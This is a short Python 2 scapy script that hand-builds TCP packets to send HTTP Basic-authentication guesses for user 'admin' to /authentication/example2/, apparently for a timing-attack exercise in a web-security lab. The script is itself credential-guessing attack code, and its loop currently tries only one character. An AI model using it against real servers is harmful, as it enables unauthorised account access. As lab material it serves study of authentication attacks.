import base64
import sys
import random
import scapy.all as scapy

try:
    password = sys.argv[1]
    if password == 'blank':
        password = ''
except:
    print 'Usage: authex2.py password destination\nUse blank to pass an empty string'
    sys.exit(0)

username = 'admin'
dest = sys.argv[2]

#For loop to generate characters of the password in argument + a-z
for i in range(ord('a'), ord('a')+1):
    #Build new password with argument + chr(i)
    newpass = password + chr(i)
    #print 'Trying ' + username + ':' + password + chr(i)
    login = username + ':' + newpass
    #Base 64 encode the username:password pair
    encoded = base64.b64encode(login)
    #print 'b64: ' + encoded
    #TCP Handshake with webserver
    #print 'Building TCP Handshake...'
    syn = (scapy.IP(dst=dest) / scapy.TCP(sport=random.randint(1025,65500),dport=80, flags='S'))
    syn_ack = scapy.sr1(syn,verbose=1)
    print syn_ack.show()
    #Send ACK
    out_ack = scapy.send(scapy.IP(dst=dest) / \
            scapy.TCP(dport=80, sport=syn_ack[scapy.TCP].dport,seq=syn_ack[scapy.TCP].ack, ack=syn_ack[scapy.TCP].seq + 1, flags = 'A')) 
    #print 'Sending GET request...'
    getStr = 'GET /authentication/example2/ HTTP/1.1\r\nHost:' \
    + dest +'\r\nAuthorization: Basic ' \
    + encoded + '\r\n\r\n'
    packet = scapy.IP(dst=dest) / \
            scapy.TCP(dport=80, sport=syn_ack[scapy.TCP].dport, seq=syn_ack[scapy.TCP].ack, \
            ack=syn_ack[scapy.TCP].seq + 1, flags='P''A') / \
            getStr
    print 'Sending this packet....'
    packet.show()
    getReply = scapy.sr(packet, verbose=1)
    print getReply[0].show()
    #print 'Response time for ' + newpass + ': ' + str(responsetime)
